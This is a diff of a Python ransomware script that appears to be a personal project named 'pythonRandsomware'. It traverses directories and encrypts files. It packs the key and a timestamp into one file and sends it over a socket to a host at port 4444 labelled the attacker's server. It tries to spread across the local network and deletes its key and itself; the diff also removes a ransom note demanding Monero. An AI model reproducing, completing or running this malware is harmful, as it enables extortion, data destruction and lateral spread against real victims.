@@ -1,15 +1,5 @@
 # Author: SergioZ3R0
 #region Imports
-from cyberSec.pythonRandsomware.spread import network_prefix
-
-
-
-
-
-
-
-
-
 imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
 #Install necessary modules
 def install(package): # Install the required package
@@ -33,6 +23,7 @@ import winrm
 from smb.SMBConnection import SMBConnection
 import spread
 #endregion
+#region Definitions
 files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
     global files
@@ -53,7 +44,7 @@ def recorrer_arbol_directorios(directory):
                     print("File:", rute_element)
                     files.append(rute_element)
     except Exception as e:
-        print("Mondongo")
+        print(f"Error finding files: {e}")
     print(files)
 
 def send_file_to_host(file_path, host, port): # Send the key file to the attacker
@@ -65,7 +56,14 @@ def send_file_to_host(file_path, host, port): # Send the key file to the attacke
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
         s.connect((host, port)) # Connect to the attacker's server
         s.sendall(data) # Send the file
-#### Main
+
+def unify_files(file1, file2, unified_file):
+    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
+        uf.write(f1.read())
+        uf.write('\n')
+        uf.write(f2.read())
+#endregion
+#region Main
 
 recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))
 
@@ -89,26 +87,22 @@ for file in files:
 with open("encryption_time.txt", "w") as f:
     f.write(str(datetime.now()))
 
-def unify_files(file1, file2, unified_file):
-    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
-        uf.write(f1.read())
-        uf.write('\n')
-        uf.write(f2.read())
 
-# Usage
+
+# Usage unify_files
 unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')
 
 # Usage: send_file
 try:
     send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
 except:
-    print("Error sending file Unreachable host")
+    print(f"Error sending file: {e}")
 
 
 #Delete the randsomware
-#os.remove("key.key")
-#os.remove("encryption_time.txt")
-#os.remove("unified_file.txt")
+os.remove("key.key")
+os.remove("encryption_time.txt")
+os.remove("unified_file.txt")
 #region Spread
 network_prefix = "192.168.1"
 try:
@@ -146,10 +140,6 @@ except Exception as e:
     print(f"Error spreading: {e}")
 #endregion
 window.Window()
-if sys.platform == "linux":
-    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
-else:
-    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted Send me 100 Monero(XMR) to my wallet(WALLET)", "Notification", 1)
-print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
 
-#os.remove("darthvader.py")
+os.remove("darthvader.py")
+#endregion
